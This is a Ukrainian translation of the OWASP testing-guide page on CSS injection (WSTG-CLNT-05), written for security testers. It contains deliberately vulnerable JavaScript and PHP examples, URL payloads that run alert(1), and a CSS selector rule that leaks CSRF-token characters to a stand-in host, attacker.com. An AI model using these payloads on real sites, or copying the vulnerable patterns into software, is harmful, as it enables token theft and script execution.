# Тестування на CSS Ін'єкцію

## ID
**WSTG-CLNT-05**

## Анотація

Вразливість CSS ін'єкції виникає, коли зловмисник може впровадити довільний CSS-код у контекст довіреного веб-сайту, що відображається в браузері жертви. Наслідки такої вразливості залежать від впровадженого CSS-коду. Вона може призвести до кроссайтового скриптингу (XSS) або викрадення даних.

Ця вразливість виникає, коли застосунок дозволяє користувацькому CSS втручатися у легітимні таблиці стилів застосунку. Впровадження коду в CSS-контекст може надати атакувальнику можливість виконувати JavaScript за певних умов або витягувати конфіденційні дані, використовуючи селектори CSS та функції, здатні генерувати HTTP-запити. Загалом, дозвіл користувачам налаштовувати сторінки через надання власних CSS-файлів є значним ризиком.

## Приклад вразливого коду
Наведений нижче JavaScript-код демонструє можливий вразливий сценарій, у якому атакувальник може контролювати `location.hash` (джерело), що передається у функцію `cssText` (злив даних). 

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
        document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

Зловмисник може націлитися на жертву, попросивши її відвідати такі URL-адреси:

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera [8,12])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

Така ж уразливість може з’явитися у випадку відображеного XSS, наприклад, у такому коді PHP:

```css
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Подальші сценарії атак передбачають можливість витягувати дані за допомогою чистих правил CSS. Такі атаки можуть здійснюватися через селектори CSS, що призводить до викрадання даних, наприклад, токенів CSRF.

Ось приклад коду, який намагається вибрати вхід із `назвою`, що відповідає `csrf_token`, і `значенням`, що починається з `a`. Використовуючи атаку грубої сили для визначення значення атрибута, можна здійснити атаку, яка надсилає значення в домен зловмисника, наприклад, намагаючись встановити фонове зображення для вибраного вхідного елемента.

```css
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

Інші атаки з використанням запитуваного вмісту, наприклад CSS, висвітлюються в [виступі Маріо Хайдеріха «Got Your Nose» на YouTube](https://www.youtube.com/watch?v=FIQvAaZj_HA).

### Цілі тестування

- Визначте точки впровадження CSS
- Оцініть вплив ін'єкції

### Як тестувати

Потрібно проаналізувати код, щоб визначити, чи дозволено користувачеві вставляти вміст у контекст CSS. Зокрема, слід перевірити спосіб, у який веб-сайт повертає правила CSS на основі введених даних. 

Нижче наведено базовий приклад:
```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Наведений вище код містить вихідний `location.hash`, керований зловмисником, який можна вставити безпосередньо в атрибут `style` елемента HTML. Як згадувалося вище, це може призвести до різних результатів залежно від використовуваного браузера та наданого корисного навантаження.

На наступних сторінках наведено приклади вразливостей впровадження CSS:

- [Зломщик паролів через CSS і HTML5](https://html5sec.org/invalid/?length=25)
- [Читання атрибутів CSS](http://eaea.sirdarckcat.net/cssar/v2/)
- [Атаки на основі JavaScript із використанням `CSSStyleDeclaration` із неекранованим введенням](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Додаткові ресурси OWASP щодо запобігання ін’єкціям CSS див. у шпаргалці [Securing Cascading Style Sheets](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
